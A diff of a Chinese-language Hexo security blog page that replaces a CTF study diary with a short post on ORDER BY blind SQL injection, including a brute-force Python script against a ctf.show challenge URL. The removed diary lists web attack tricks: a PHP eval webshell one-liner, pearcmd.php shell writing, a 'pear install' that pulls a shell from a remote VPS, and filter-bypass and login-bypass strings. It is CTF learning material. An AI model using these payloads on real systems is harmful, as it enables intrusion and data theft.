@@ -185,7 +185,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/01/24/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/11/order-by-%E7%9B%B2%E6%B3%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -199,7 +199,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2024/01/24/%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/" class="post-title-link" itemprop="url">学习日记</a>
+            <a href="/2024/02/11/order-by-%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">order by 盲注</a>
         </h2>
 
         <div class="post-meta">
@@ -208,23 +208,17 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2024-01-24 19:10:54" itemprop="dateCreated datePublished" datetime="2024-01-24T19:10:54+08:00">2024-01-24</time>
+              <time title="创建时间：2024-02-11 19:11:39 / 修改时间：20:14:39" itemprop="dateCreated datePublished" datetime="2024-02-11T19:11:39+08:00">2024-02-11</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-02-23 17:51:43" itemprop="dateModified" datetime="2024-02-23T17:51:43+08:00">2024-02-23</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E6%97%A5%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">日记</span></a>
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
                 </span>
             </span>
 
@@ -234,14 +228,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.5k</span>
+              <span>794</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>1 分钟</span>
             </span>
 
         </div>
@@ -253,79 +247,20 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>记录寒假期间学习</p>
-<h1 id="2024-1-25"><a href="#2024-1-25" class="headerlink" title="2024.1.25"></a>2024.1.25</h1><p>这几天要练车，学的东西不会很多，等考试完之后就好了</p>
-<p>伪协议死亡绕过，file_put_contents可以利用伪协议，base64编码，<code>4位转3位</code>将前面的内容解码成base64不认识的字符。</p>
-<p>highlightg_file()也可以用伪协议</p>
-<p>in_array延用了php中的== 弱比较特性</p>
-<h1 id="2024-1-26"><a href="#2024-1-26" class="headerlink" title="2024.1.26"></a>2024.1.26</h1><p><strong>ereg()<strong>函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是</strong>大小写敏感</strong>的。ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用**%00截断**正则匹配</p>
-<p>制表符(%09)、换行符(%0a)、回车符(%0d)、空字节符(%00)、垂直制表符（%0b），<strong>但不去除换页符（%0c）</strong></p>
-<p>$_SERVER[‘QUERY_STRING’];获取的查询语句是服务端还没url解码之前的字符串</p>
-<h1 id="2024-1-27"><a href="#2024-1-27" class="headerlink" title="2024.1.27"></a>2024.1.27</h1><h2 id="python格式化字符串漏洞"><a href="#python格式化字符串漏洞" class="headerlink" title="python格式化字符串漏洞"></a>python格式化字符串漏洞</h2><p>影响python2.6之后，漏洞存在的必要条件是：可以控制字符串（一般是字符串拼接了用户的输入，一般用于format。</p>
-<p>例如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; a=&#x27;class of &#123;0&#125; is &#123;0.__class__&#125;&#x27;.format(&#x27;a&#x27;)</span><br><span class="line">&gt;&gt;&gt; print(a)</span><br><span class="line">class of a is &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
+          <h1 id="order-by比较大小盲注"><a href="#order-by比较大小盲注" class="headerlink" title="order by比较大小盲注"></a>order by比较大小盲注</h1><p><img src="/pic/orderby1.png"></p>
+<p>这是表里的所有东西</p>
+<p>如果我们执行<code>select * from flag where id=&#39;&#39; or 1 union select 1,1 order by 2;</code>会出现</p>
+<p><img src="/pic/orderby2.png"></p>
+<p>不能用<code>and</code>否则就相当于创建了一个虚拟的表，查询不到原来的数据。</p>
+<p>我们知道flag的第一位是<code>f</code>，如果我们查询<code>select * from flag where id=&#39;&#39; or 1 union select 1,&#39;f&#39; order by 2;</code>会发生什么呢？</p>
+<p><img src="/pic/orderby3.png"></p>
+<p>还是这样，第一行没什么用，但是如果我们查询的是<code>g</code>的话就会变成这样</p>
+<p><img src="/pic/orderby4.png"></p>
+<p>flag的值就会出现在第一行，我们就可以利用这一点来进行order by盲注</p>
+<p>脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://4ef0329e-10b4-4bd1-bf0a-0d80fe83129d.challenge.ctf.show/&quot;</span></span><br><span class="line"><span class="built_in">str</span>=string.digits+string.ascii_letters</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">j=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#x27; or 1 union select 1,2,&#x27;&#123;0&#125;&#x27; order by 3#&quot;</span>.<span class="built_in">format</span>(flag+s),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1111&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;&lt;/code&gt;admin&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(s)-<span class="number">1</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
 
-<p><code>&#123;&#125;</code>是我们要控制的地方。</p>
-<p>_()也是一个函数， _()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll。</p>
-<p>get_defined_vars — 返回由所有已定义变量所组成的数组</p>
-<p>php伪协议可以套一层协议，无效的话会被忽略</p>
-<p>在preg_match中**.<strong>表示任意单个字符，</strong>+<strong>表示必须匹配1次或多次，</strong>+?**表示 重复1次或更多次，但尽可能少重复</p>
-<p>stripos应用于数组时会返回<strong>null</strong></p>
-<p>**call_user_func()**可以利用数组传递参数</p>
-<h1 id="2024-1-29"><a href="#2024-1-29" class="headerlink" title="2024.1.29"></a>2024.1.29</h1><p>**create_function()**注入，参考链接: <a target="_blank" rel="noopener" href="https://paper.seebug.org/94/">https://paper.seebug.org/94/</a> 通过控制参数导致闭合创建的匿名函数执行恶意代码。</p>
-<p>在php中**\**时最大的命名空间，例如\system就是多加了一个绝对路径</p>
-<p>在PHP中可以用中文做变量名</p>
-<h1 id="2024-1-30"><a href="#2024-1-30" class="headerlink" title="2024.1.30"></a>2024.1.30</h1><blockquote>
-<p>string md5( string $str[, bool $raw_output = false] )</p>
-<ul>
-<li>raw_output：如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</li>
-</ul>
-</blockquote>
-<p><code>ffifdyop</code>是一个特殊的字符串，类似万能密码。还有<code>129581926211651571912466741651878684928</code>,<code>4611686052576742364</code>也可以达到同样的效果。</p>
-<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p>
-<h1 id="2024-1-31"><a href="#2024-1-31" class="headerlink" title="2024.1.31"></a>2024.1.31</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/sinrier/article/details/112734996">sql注入right/left join</a></p>
-<h1 id="2024-2-1"><a href="#2024-2-1" class="headerlink" title="2024.2.1"></a>2024.2.1</h1><p>今天考科三，考了一整天。。。</p>
-<h1 id="2024-2-3"><a href="#2024-2-3" class="headerlink" title="2024.2.3"></a>2024.2.3</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PHP代码审计用 RIPS  https://sourceforge.net/projects/rips-scanner/</span><br><span class="line">2、JAVA代码审计用 findbugs http://findbugs.sourceforge.net/downloads.html https://www.jianshu.com/p/c43940c4e025</span><br><span class="line">3、 .net https://security-code-scan.github.io/</span><br><span class="line">4、多种语言代码检查工具  sonar： https://docs.sonarqube.org/display/SONAR</span><br><span class="line">https://www.sonarsource.com/products/codeanalyzers/sonarjava/rules.html#Vulnerability_Detection</span><br><span class="line">https://github.com/SonarSource/sonarqub </span><br><span class="line">5、fortify 这个也是很好用的</span><br></pre></td></tr></table></figure>
-
-<h1 id="2024-2-4"><a href="#2024-2-4" class="headerlink" title="2024.2.4"></a>2024.2.4</h1><p>终于考完驾照了。（开心）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">常见 Express 模板引擎有(包括但不限于如下)：</span><br><span class="line"></span><br><span class="line">- jade</span><br><span class="line">- pug</span><br><span class="line">- ejs</span><br><span class="line">- dust.js</span><br><span class="line">- nunjunks</span><br></pre></td></tr></table></figure>
-
-<h1 id="2024-2-8"><a href="#2024-2-8" class="headerlink" title="2024.2.8"></a>2024.2.8</h1><p>在<code>&lt;!----&gt;</code>里的php可以执行例如<code>&lt;！--&lt;?=eval($_POST[1])?&gt;--&gt;</code></p>
-<h1 id="2024-2-11"><a href="#2024-2-11" class="headerlink" title="2024.2.11"></a>2024.2.11</h1><p><code>%0a绕过过滤管道符</code></p>
-<p><em><strong>escapeshellarg\escapeshellcmd绕过</strong></em>:<a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116902085">https://blog.csdn.net/LYJ20010728/article/details/116902085</a></p>
-<p><a target="_blank" rel="noopener" href="https://872323857.github.io/2024/02/11/order-by-%E7%9B%B2%E6%B3%A8/">order 大小比较盲注</a></p>
-<p>addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p>
-<p>preg_replace中的第二个参数如果是%00也就是ascii中的0,那么将会匹配到整个字符串。</p>
-<h1 id="2024-2-12"><a href="#2024-2-12" class="headerlink" title="2024.2.12"></a>2024.2.12</h1><h4 id="pearcmd-php本地文件包含"><a href="#pearcmd-php本地文件包含" class="headerlink" title="pearcmd.php本地文件包含"></a>pearcmd.php本地文件包含</h4><p><code>pearcmd.php</code>的安装路径在<code>/usr/local/lib/php/</code></p>
-<p>可以利用<code>config-create</code>来创建shell</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php</span><br></pre></td></tr></table></figure>
-
-<p>该命令会把<code>phpinfo()</code>的内容写入<code>/tmp/hellp.php</code>中，当然前提是包含<code>/usr/local/lib/php/pearcmd.php</code></p>
-<p>pearcmd.php也可以拉取远程代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install -R /tmp http://vps/shell.php</span><br></pre></td></tr></table></figure>
-
-<p>前提也是包含paercmd.php</p>
-<h1 id="2024-2-17"><a href="#2024-2-17" class="headerlink" title="2024.2.17"></a>2024.2.17</h1><p>前几天去洛阳玩了。。。。。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#&#125;(代表0)、$&#123;##&#125;(代表1)</span><br><span class="line">$&#x27;\154\163&#x27; (将八进制转换为字符)</span><br></pre></td></tr></table></figure>
-
-<p>如果只允许<code>$()#!&#123;&#125;&lt;\</code>可以参考这个文章<a target="_blank" rel="noopener" href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60"></a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1337 === Number(String(Number(1)).concat(3).concat(3).concat(7))</span><br><span class="line">constructor.length.constructor =[Function: Number]</span><br><span class="line">constructor.name.constructor = [Function: String]</span><br><span class="line">constructor.constructor.length = 1</span><br><span class="line">console.dir.name.length =&gt; &quot;dir&quot;.length = 3</span><br><span class="line">console.context.name.length =&gt; &quot;context&quot;.length = 7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>SESSION文件</p>
-<p><code>$_SESSION[&#39;key&#39;]=&#39;value&#39;;</code>在文件中表示为<code>key|s:5:&quot;value&quot;;</code></p>
-<h1 id="2024-2-18"><a href="#2024-2-18" class="headerlink" title="2024.2.18"></a>2024.2.18</h1><p>在json里如果有字符被过滤了，可以用unicode绕过</p>
-<h1 id="2024-2-22"><a href="#2024-2-22" class="headerlink" title="2024.2.22"></a>2024.2.22</h1><p>寒假要结束了。。。。。。</p>
-<p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数</p>
-<p>例如:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$a=&#x27;system&#x27; </span><br><span class="line">$a(&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure>
-
-<h2 id="preg-match和preg-match-all的区别"><a href="#preg-match和preg-match-all的区别" class="headerlink" title="preg_match和preg_match_all的区别"></a>preg_match和preg_match_all的区别</h2><p>preg_match() 返回 pattern 所匹配的次数。要么是 0 次（没有匹配）或 1 次，因为 preg_match() 在第一次匹配之后将停止搜索。preg_match_all() 则相反，会一直搜索到 subject 的结尾处。如果出错 preg_match() 返回 FALSE。</p>
-<p><code>base_convert() </code>函数在任意进制之间转换数字。</p>
-<p><code>&#123;&#125;</code>可以代替<code>[]</code></p>
-<h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p><img src="/pic/getall.png"></p>
-<p>常用于无参rce</p>
-<hr>
-<p><code>dechex() </code>函数把十进制数转换为十六进制数。</p>
+<p>根据脚本自行修改</p>
 
       
     </div>
@@ -734,7 +669,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-18 19:34:46" itemprop="dateModified" datetime="2023-09-18T19:34:46+08:00">2023-09-18</time>
+                <time title="修改时间：2024-11-11 19:34:21" itemprop="dateModified" datetime="2024-11-11T19:34:21+08:00">2024-11-11</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -742,7 +677,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">内网靶场</span></a>
+                  <a href="/categories/boot2root/" itemprop="url" rel="index"><span itemprop="name">boot2root</span></a>
                 </span>
             </span>
 
@@ -1492,13 +1427,13 @@
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">19</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">15</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -1525,7 +1460,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
@@ -1534,12 +1469,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">129k</span>
+    <span title="站点总字数">126k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">1:57</span>
+    <span title="站点阅读时长">1:54</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
